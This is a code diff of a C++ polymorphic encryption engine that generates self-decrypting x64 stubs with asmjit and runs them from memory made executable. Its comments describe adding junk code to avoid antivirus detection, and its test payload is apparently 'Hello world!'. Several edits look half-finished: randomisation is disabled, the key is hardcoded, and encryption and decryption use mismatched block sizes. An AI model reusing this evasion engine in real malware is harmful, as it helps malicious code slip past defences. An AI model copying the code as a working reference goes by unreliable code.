@@ -3,26 +3,33 @@
 
 using namespace asmjit;
 using namespace asmjit::x86;
+using namespace std;
 
 
 /**
  * Sets the registers to be used in the polymorphic phase. The election is done at random.
  */
-void CMutagenSPE::RandomizeRegisters()
+void CMutagenSPE::SelectRegisters()
 {
-  Gp cRegsGeneral[] =  {regs::eax, regs::ecx, regs::ebx, regs::edx, regs::esi, regs::edi};
+  Gp regsAvailable[] =  {regs::rax, regs::rcx, regs::rdx ,regs::rsi, regs::rdi, regs::r8, regs::r9, regs::r10, regs::r11};
 
-  std::random_shuffle(&cRegsGeneral[0], &cRegsGeneral[6]);  // shuffle the order to randomize register election
+  // shuffle the order to randomize register election
+  //std::random_shuffle(&regsAvailable[0], &regsAvailable[6]);  
 
-  regSrc = cRegsGeneral[0];  // will contain pointer to encryted data
-  regDst = cRegsGeneral[1];  // will contain pointer to output buffer (function parameter)
-  regSize = cRegsGeneral[2];  // will contain size of encrypted data buffer
-  regKey = cRegsGeneral[3];  // will contain decryption key
-  regData = cRegsGeneral[4];  // will contain data that is been operated by the decryption function
+  regSrc = regsAvailable[0];  // will contain pointer to encryted data
+  regDst = regsAvailable[1];  // will contain pointer to output buffer (function parameter)
+  regSize = regsAvailable[2];  // will contain size of encrypted data buffer
+  regKey = regsAvailable[3];  // will contain decryption key
+  regData = regsAvailable[4];  // will contain data that is been operated by the decryption function
+  regSafe1 = regs::rsi; 
+  regSafe2 = regs::rdi; 
+  regSafe3 = regs::rbx; 
 
-  regSafe1 = regs::esi;  //cRegsSafe[0];
-  regSafe2 = regs::edi;  //cRegsSafe[1];
-  regSafe3 = regs::ebx;  //cRegsSafe[2];
+  //std::cout << "> Source encrypted data register (regSrc): " << regSrc.id() << "\n";
+  //std::cout << "> Size of encrypted data buffer register (regSize): " << regSize.id() << "\n";
+  //std::cout << "> Output buffer register (regDst): " << regDst.id() << "\n";
+  //std::cout << "> Decryption key register (regKey): " << regKey.id() << "\n";
+  //std::cout << "> Register holding in-use data (regData): " << regData.id() << "\n";
 }
 
 
@@ -33,80 +40,100 @@ void CMutagenSPE::GeneratePrologue(x86::Assembler& a)
 {
 
   // save original value of EBP is saved so it can be used to refer to the stack frame. two equivalent options
-  if (rand()%2 == 0) {
-    a.push(ebp);
-    a.mov(ebp, esp);    
+  /*if (rand()%2 == 0) {
+    a.push(rbp);  // push  ebp
+    a.mov(rbp, rsp);  // mov  ebp, esp
 
   } else {
-    a.enter(imm(0), imm(0));
-  }
+    a.enter(imm(0), imm(0));  // enter  0x0, 0x0
+  }*/
 
   // save sensitive registers. if using stdcall convention, these regs are: ESI, EDI, or EBX
-  a.push(regSafe1);
-  a.push(regSafe2);
-  a.push(regSafe3);
+  //a.push(regSafe1);  // push  rsi
+  //a.push(regSafe2);  // push  rdi
+  //a.push(regSafe3);  // push  rbx
+  //a.push(rax);
+  //a.ret();
+  //a.push(rcx);
+  //a.push(rdx);
+  //a.push(rsi);
+  //a.push(rsp);
+
+
 
   // load the pointer to the output buffer
-  a.mov(regDst, dword_ptr(regs::ebp, 0x08 + (4 * 0)));
+  a.mov(regDst, rdi);  // mov  regDest, [ebp+0x8]
 }
 
 
 /**
- * Generate code to obtain pointer to encryptd data which is appended at the end of the function.
+ * Generate code to obtain pointer to encrypted data which is appended at the end of the function.
  */
 void CMutagenSPE::GenerateDeltaOffset(x86::Assembler& a)
 {
+  //std::cout << "> Asmjit offset before calling 'delta_offset' is: " << a.offset() << "\n";
+
+  // create the 'delta_offset' label
+  lblDeltaOffset = a.newLabel();  
   
-  lblDeltaOffset = a.newLabel();  // create the delta_offset label
-  a.call(lblDeltaOffset);  // generate 'call delta_offset'
+  // generate call to the delta_offset label
+  a.call(lblDeltaOffset);  // call  delta_offset
+
   size_t posUnusedCodeStart = a.offset(); // Get the current offset
+  //std::cout << "> Asmjit offset after calling 'delta_offset' is: " << posUnusedCodeStart << "\n";
 
-  // random code addition to avoid antivirus detection
+/*  // random code addition to avoid antivirus detection
   if (rand()%2 == 0)
-    a.mov(regs::eax, imm(1));
+    a.mov(regs::rax, imm(1));
   else
-    a.xor_(regs::eax, regs::eax);
-
+    a.xor_(regs::rax, regs::rax);
   a.leave();
   a.ret(1 * sizeof(unsigned long));
+*/
 
   dwUnusedCodeSize = static_cast<unsigned long>(a.offset() - posUnusedCodeStart); // calculate size of the unused code
   a.bind(lblDeltaOffset);  // bind the label here
   posDeltaOffset = a.offset();
 
   // read the stack and get value
-  a.mov(regSrc, dword_ptr(regs::esp));
-  a.add(regs::esp, imm(sizeof(unsigned long)));
+  //a.mov(regSrc, ptr(regs::rsp));  // mov  regSrc, [esp]
+  //a.add(regs::rsp, imm(4));  // add  esp, 0x4
+  a.pop(regSrc);
+  //a.sub(regSrc, imm(posDeltaOffset));
 
   // generate instruction which will be updated later with offset size
-  a.long_().add(regSrc, imm(987654321));
+  a.long_().add(regSrc, imm(000000));  // add  regSrc, 0x??????????
+
 
   // save position of code for later reference
-  posSrcPtr = a.offset() - sizeof(unsigned long);
+  //posSrcPtr = a.offset();
+  posSrcPtr = a.offset() - 4;
+  //std::cout << "a.offset()-4: " << posSrcPtr << "\na.offset(): " << posSrcPtr+4 << "\n";
+   
 }
 
 
 /**
  * Generate the encryption keys, encryption instructions, and finally encrypt the input data
  */
-void CMutagenSPE::EncryptInputBuffer( unsigned char * lpInputBuffer, unsigned long dwInputBuffer, 
+void CMutagenSPE::EncryptInputBuffer(char * lpInputBuffer, unsigned long dwInputBuffer, 
                                       unsigned long dwMinInstr, unsigned long dwMaxInstr )
 {
   // generate encryption key
   dwEncryptionKey = (unsigned long) rand();  
-  DEBUG2("generated encryption key: ", dwEncryptionKey);
+  DEBUG2("> generated encryption key: ", dwEncryptionKey);
 
   // round up the size of the input buffer
   unsigned long dwAlignedSize __attribute__ ((aligned)) = dwInputBuffer; 
-  DEBUG2("not rounded sze of the input buffer: ", dwInputBuffer);
-  DEBUG2("rounded size of the input buffer:    ", dwAlignedSize);
+  DEBUG2("> size of the input buffer: ", dwInputBuffer);
+  //DEBUG2("rounded size of the input buffer: ", dwAlignedSize);
   
   // number of blocks to encrypt
-  dwEncryptedBlocks = dwAlignedSize / sizeof(unsigned long); 
-  DEBUG2("number of blocks to encrypt:", dwEncryptedBlocks);
+  dwEncryptedBlocks = (unsigned long) ceil((float)dwAlignedSize / sizeof(unsigned long)); 
+  DEBUG2("number of blocks to encrypt: ", dwEncryptedBlocks);
 
   // cast input buffer pointer from char to long
-  unsigned long * lpdwInputBuffer = reinterpret_cast<unsigned long *>(lpInputBuffer);
+  //unsigned long * lpdwInputBuffer = reinterpret_cast<unsigned long *>(lpInputBuffer);
 
   // allocate memory for the output data (rounded to block size)
   if ( posix_memalign((void **)&diEncryptedData, BLOCK_SIZE, dwAlignedSize) ){
@@ -114,11 +141,8 @@ void CMutagenSPE::EncryptInputBuffer( unsigned char * lpInputBuffer, unsigned lo
     exit(MUTAGEN_ERR_MEMORY);
   }
 
-
-
-
-  // cast input buffer pointer from char to long
-  unsigned long * lpdwOutputBuffer = reinterpret_cast<unsigned long *>(diEncryptedData);
+  // cast output buffer pointer from char to long
+  //unsigned long * lpdwOutputBuffer = reinterpret_cast<unsigned long *>(diEncryptedData);
 
   // randomly select the number of encryption instructions
   dwCryptOpsCount = dwMinInstr + rand() % (( dwMaxInstr + 1 ) - dwMinInstr);
@@ -151,11 +175,10 @@ void CMutagenSPE::EncryptInputBuffer( unsigned char * lpInputBuffer, unsigned lo
   }
 
   // encrypt the input data according to instructions just generated
-  std::cout << "Encypted data:\n";
-  for (unsigned long i = 0, dwInitialEncryptionKey = dwEncryptionKey; i < dwEncryptedBlocks; i++)
+  for (unsigned long i = 0, dwInitialEncryptionKey = dwEncryptionKey; i < dwInputBuffer; i++)
   {
     // take the next block for encryption
-    unsigned long dwInputBlock = lpdwInputBuffer[i];
+    char dwInputBlock = lpInputBuffer[i];
 
     // encryption loop: executes the sequence of encryption instructions on the data block
     for (unsigned long j = 0, dwCurrentEncryptionKey; j < dwCryptOpsCount; j++)
@@ -185,15 +208,18 @@ void CMutagenSPE::EncryptInputBuffer( unsigned char * lpInputBuffer, unsigned lo
         break;
       }
     }
-
     // store the encrypted block in the buffer
-    lpdwOutputBuffer[i] = dwInputBlock;
-    std::cout << "[" << dwInputBlock << "] ";
+    diEncryptedData[i] = dwInputBlock;
+    //std::cout << "LOOOOOOOOOOP\n"; 
   }
-  std::cout << "\n";
-
+  //std::cout << "Payload:   ";
+  //for(int i =0; i<(int)dwInputBuffer; i++)
+    //std::cout << "[" <<lpInputBuffer[i] << "]";
+  //std::cout << "\nEncrypted: ";
+  //for(int i =0; i<(int)dwInputBuffer; i++)
+    //std::cout << "[" <<diEncryptedData[i] << "]";
+  //std::cout << "\n";
 }
-
 
 /**
  * Set up the keys which will be used to decrypt the data in the apropiate registers
@@ -203,7 +229,8 @@ void CMutagenSPE::SetupDecryptionKeys(x86::Assembler& a)
   
   unsigned long dwKeyModifier = (unsigned long) rand();
 
-  switch(rand()%3)
+  //switch(rand()%3)
+  switch(3)
   {
   case 0:
     a.mov(regKey, imm(dwEncryptionKey - dwKeyModifier));
@@ -217,6 +244,10 @@ void CMutagenSPE::SetupDecryptionKeys(x86::Assembler& a)
     a.mov(regKey, imm(dwEncryptionKey ^ dwKeyModifier));
     a.xor_(regKey, imm(dwKeyModifier));
     break;
+  case 3:
+    a.mov(regKey, imm(13));
+    break;
+
   }
 }
 
@@ -234,7 +265,7 @@ void CMutagenSPE::GenerateDecryption(x86::Assembler& a)
   a.bind(lblDecryptionLoop);
 
   // read the data referred to by the regSrc register
-  a.mov(regData, dword_ptr(regSrc));
+  a.mov(regData, qword_ptr(regSrc));
 
   // build the decryption code by generating each decryption instruction in reverse
   for (int i = dwCryptOpsCount - 1; i != -1; i--)
@@ -286,11 +317,13 @@ void CMutagenSPE::GenerateDecryption(x86::Assembler& a)
   }
 
   // write the decrypted block to the output buffer
-  a.mov(dword_ptr(regDst), regData);
+  a.mov(qword_ptr(regDst), regData);
 
   // update the pointers to the input and ouput buffers to point to the next block
-  a.add(regSrc, imm(sizeof(unsigned long)));
-  a.add(regDst, imm(sizeof(unsigned long)));
+  //a.add(regSrc, imm(sizeof(unsigned long)));
+  //a.add(regDst, imm(sizeof(unsigned long)));
+  a.add(regSrc, imm(8));
+  a.add(regDst, imm(8));
 
   // decrement the loop counter (the number of blocks remaining to decrypt)
   a.dec(regSize);
@@ -330,24 +363,36 @@ void CMutagenSPE::SetupOutputRegisters(SPE_OUTPUT_REGS *regOutput, unsigned long
 void CMutagenSPE::GenerateEpilogue(unsigned long dwParamCount, x86::Assembler& a)
 {
   // restore the original values of registers ESI EDI EBX
-  a.pop(regSafe3);
-  a.pop(regSafe2);
-  a.pop(regSafe1);
+  //a.pop(regSafe3);
+  //a.pop(regSafe2);
+  //a.pop(regSafe1);
+  //a.pop(rsp);
+  //a.pop(rsi);
+  //a.pop(rdx);
+  //a.pop(rcx);
 
   // restore the value of EBP
-  if (rand()%2 == 0)
+  /*if (rand()%2 == 0)
   {
     a.leave();
   }
   else
   {
-    a.mov(regs::esp,regs::ebp);
-    a.pop(regs::ebp);
+    a.mov(regs::rsp,regs::rbp);
+    a.pop(regs::rbp);
   }
+  */
+  a.nop();
+  a.nop();
+  a.nop();
+  a.nop();
+  a.nop();
+  a.nop();
+  a.nop();
 
   // return to the code which called our function; additionally adjust the stack by the size of the passed
   // parameters (by stdcall convention)
-  a.ret(imm(dwParamCount * sizeof(unsigned long)));
+  a.ret(0);
 }
 
 
@@ -366,17 +411,26 @@ void CMutagenSPE::AlignDecryptorBody(unsigned long dwAlignment, x86::Assembler& 
  */
 void CMutagenSPE::UpdateDeltaOffsetAddressing(x86::Assembler& a)
 {
+
   // Get current position
   size_t current_position = a.offset(); 
   
   // Calculate the offset to the encrypted data
   unsigned long dwAdjustSize = static_cast<unsigned long>(current_position - posDeltaOffset); 
-  
+  //std::cout << "posDeltaOffset: " << posDeltaOffset << "\n";
+  //std::cout << "dwUnusedCodeSize: " << dwUnusedCodeSize << "\n";
+  //std::cout << "current_position: " << current_position << "\n";
+  //std::cout << "current_position - posDeltaOffset: " << current_position - posDeltaOffset << "\n";
+  //std::cout << "dwAdjustSize: " << dwAdjustSize <<"\n";
+  //std::cout << "dwAdjustSize + dwUnusedCodeSize: " << dwAdjustSize + dwUnusedCodeSize << "\n";
+  //std::cout << "posSrcPtr: " << posSrcPtr << "\n";
+
+
   // Go to place where reference to encrypted data is made
   a.setOffset(posSrcPtr); 
 
   // Update the instruction with proper direction
-  a.long_().add(regSrc, dwAdjustSize + dwUnusedCodeSize);
+  a.db(dwAdjustSize + dwUnusedCodeSize);
 
   // Return to position we where in previous to the patch
   a.setOffset(current_position); 
@@ -388,12 +442,6 @@ void CMutagenSPE::UpdateDeltaOffsetAddressing(x86::Assembler& a)
  */
 void CMutagenSPE::AppendEncryptedData(x86::Assembler& a)
 {
-
-  // add label to jump to
-  Label lblPayload = a.newLabel();  
-  a.call(lblPayload);
-  a.bind(lblPayload);
-
   unsigned long * lpdwEncryptedData = reinterpret_cast<unsigned long *>(diEncryptedData);
 
   // place the encrypted data buffer at the end of the decryption function (in 4-unsigned char blocks)
@@ -402,7 +450,7 @@ void CMutagenSPE::AppendEncryptedData(x86::Assembler& a)
 }
 
 
-void CMutagenSPE::WriteToFile(unsigned char *lpcDecryptionProc, unsigned long dwDecryptionProcSize)
+void CMutagenSPE::WriteToFile(void *lpcDecryptionProc, unsigned long dwDecryptionProcSize)
 {
   std::string filename = "bins/not_gonna_harm_your_pc_";
   //std::string filenum = std::to_string(rand()%10);
@@ -414,8 +462,10 @@ void CMutagenSPE::WriteToFile(unsigned char *lpcDecryptionProc, unsigned long dw
 
   if (hFile != NULL)
   {
+    DEBUG("opening output file successful");
     fwrite(lpcDecryptionProc, dwDecryptionProcSize, 1, hFile);
     fclose(hFile);
+    DEBUG("writting successful");
   }
 
 
@@ -428,7 +478,7 @@ void CMutagenSPE::WriteToFile(unsigned char *lpcDecryptionProc, unsigned long dw
 //
 ///////////////////////////////////////////////////////////
 
-int CMutagenSPE::PolySPE( unsigned char * lpInputBuffer, unsigned long dwInputBuffer, unsigned char * *lpOutputBuffer, \
+int CMutagenSPE::PolySPE( char * lpInputBuffer, unsigned long dwInputBuffer, unsigned char * *lpOutputBuffer, \
                           unsigned long * lpdwOutputSize )
 {
   DEBUG("calling main function");
@@ -441,11 +491,20 @@ int CMutagenSPE::PolySPE( unsigned char * lpInputBuffer, unsigned long dwInputBu
   CodeHolder code;              // Create a CodeHolder
   code.init(rt.environment());  // Initialize code to match the JIT environment
   Assembler a(&code);           // Create and attach x86::Assembler to code
-  //code.setLogger(&logger);      // Attach the `logger` to `code` holder
-  //logger.setFile(stdout);       // Set the standard output as the logger exit
+  code.setLogger(&logger);      // Attach the `logger` to `code` holder
+  
+  FILE *logfile = fopen("log/asmjt.log", "w+");
+
+  if (logfile != NULL) {
+    logger.setFile(logfile);  // Set file as the logger exit
+  } else {
+    ERROR("could not open asmjit.log file. redirecting log to stdout");
+    logger.setFile(stdout);  // Set the standard output as the logger exit
+  }
   
   DEBUG("randomly select registers");
-  RandomizeRegisters();
+  SelectRegisters();
+
 
   DEBUG("generate function prologue");
   GeneratePrologue(a);
@@ -461,12 +520,13 @@ int CMutagenSPE::PolySPE( unsigned char * lpInputBuffer, unsigned long dwInputBu
 
   DEBUG("generate code to set up keys for decryption");
   SetupDecryptionKeys(a);
+  
 
   DEBUG("generate decryption code");
   GenerateDecryption(a);
 
   DEBUG("set up the values of the output registers");
-  SPE_OUTPUT_REGS regOutput[] = { { regs::eax, dwInputBuffer } };
+  SPE_OUTPUT_REGS regOutput[] = { { regs::rax, dwInputBuffer } };
   SetupOutputRegisters(regOutput, 1, a);
 
   DEBUG("generate function epilogue");
@@ -488,19 +548,6 @@ int CMutagenSPE::PolySPE( unsigned char * lpInputBuffer, unsigned long dwInputBu
   // free the array of encryption pseudoinstructions
   //free(&diCryptOps);
   
-  asmjit::CodeBuffer& buf = code.sectionById(0)->buffer();
-  std::vector<uint8_t> emitted_code(buf.size());
-  memcpy(emitted_code.data(), buf.data(), buf.size());
-  const char* filename = "tmp/generated_code";
-  FILE* outfile = fopen(filename, "wb");
-  if (outfile) {
-    size_t n = emitted_code.size();
-    if (fwrite(emitted_code.data(), 1, n, outfile) == n) {
-      std::cout << "* emitted code to " << filename << "\n";
-    }
-    fclose(outfile);
-  }
-
   ///////////////////////////////////////////////////////////
   //
   // copy the polymorphic code to the output buffer
@@ -510,45 +557,90 @@ int CMutagenSPE::PolySPE( unsigned char * lpInputBuffer, unsigned long dwInputBu
   unsigned long dwOutputSize = code.codeSize();
   
   // assemble the code of the polymorphic function (this resolves jumps and labels)
+  DEBUG("assembling code and binding to a function");
   DecryptionProc lpPolymorphicCode;
   Error err = rt.add(&lpPolymorphicCode, &code);
   if (err) return 1;                // Handle a possible error returned by AsmJit.
 
   // this struct describes the allocated memory block
-  char *diOutput;
+  DEBUG("allocating memory for the execution of the function");
+  void *diOutput = mmap(0, dwOutputSize, 
+                   PROT_READ | PROT_WRITE ,
+                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+
+  if (diOutput == (void*)-1) {
+    ERROR("allocating executable memory for function");
+    exit(MUTAGEN_ERR_MEMORY);
+  }
 
   // allocate memory (with execute permissions) for the output buffer
-  posix_memalign((void **)&diOutput, BLOCK_SIZE, dwOutputSize);
+  //int pagesize = sysconf(_SC_PAGE_SIZE);
+  //int aligned_size = ceil((double)dwOutputSize/(double)pagesize);
+  //std::cout << "pagesize: " << pagesize << "\n";
+  //std::cout << "aligned_size: " << aligned_size << "\n";
+  //std::cout << "dwOutputSize: " << dwOutputSize << "\n";
+  //std::cout << "aligned_dwOutputSize: " << aligned_size*pagesize << "\n";
+  //posix_memalign((void **)&diOutput, pagesize, aligned_size*pagesize);
+
+  DEBUG("making the memory page(s) of the function executable");
+  if (mprotect(diOutput, dwOutputSize, PROT_EXEC|PROT_READ|PROT_WRITE) == -1){
+    ERROR("could not make output buffer's page executable");
+    exit(MUTAGEN_ERR_MEMORY);
+  }
 
   // check that allocation was successful
   if (diOutput != NULL)
   {
     // copy the generated code of the decryption function
-    memcpy(diOutput, (void *)lpPolymorphicCode, dwOutputSize);
+    DEBUG("copying to memory the function code");
+    //memcpy(diOutput, (void *)lpPolymorphicCode, dwOutputSize);
+    asmjit::CodeBuffer& buf = code.sectionById(0)->buffer();
+    memcpy(diOutput, buf.data(), buf.size());
+
+
 
     // provide the output buffer and code size to
     // this function's caller
     *lpOutputBuffer = (unsigned char *)diOutput;
     *lpdwOutputSize = dwOutputSize;
 
-    WriteToFile(*lpOutputBuffer, dwOutputSize);
+    DEBUG("writing the code to a function");
+    WriteToFile(diOutput, dwOutputSize);
 
+    DEBUG("creating output buffer for the function");
+    
     char *szOutputBuffer;
-    szOutputBuffer = (char *) malloc(32);
+    szOutputBuffer = (char *) malloc(dwInputBuffer);
+    if (szOutputBuffer == NULL) {
+      ERROR("could not allocate memory for output buffer for the decrypted data");
+      exit(MUTAGEN_ERR_MEMORY);
+    } 
+    
+    DecryptionProc function = reinterpret_cast<DecryptionProc>(diOutput);
 
-    // call the decryption function via its
-    // function pointer
-    unsigned int dwOutputSize = lpPolymorphicCode(szOutputBuffer);
+    //char szOutputBuffer[128] = { (char) 0xCC };
+    std::cout << "Output buffer addr " <<  &szOutputBuffer << "\n";
+    std::cout << "Poly function addr " <<  &function << "\n";
+
+    // call the decryption function via its function pointer
+    //DecryptionProc function = reinterpret_cast<DecryptionProc>(lpOutputBuffer);
+    DEBUG("calling function");
+    unsigned long dwOutputSize = function(szOutputBuffer);
+    //unsigned int dwOutputSize = function(2);
 
     // display the decrypted text - if everything
     // went correctly this will show "Hello world!"
     std::cout << "Results:\n";
     std::cout << "returned size: " << dwOutputSize << "\n";
+    std::cout << "decrypted payload: [" << *szOutputBuffer << "]\n";
+
+    //std::flush(std::cout);
     
     rt.release(lpPolymorphicCode);
   }
   else
   {
+    ERROR("could not allocate memory for output file");
     rt.release(lpPolymorphicCode);
 
     return MUTAGEN_ERR_MEMORY;
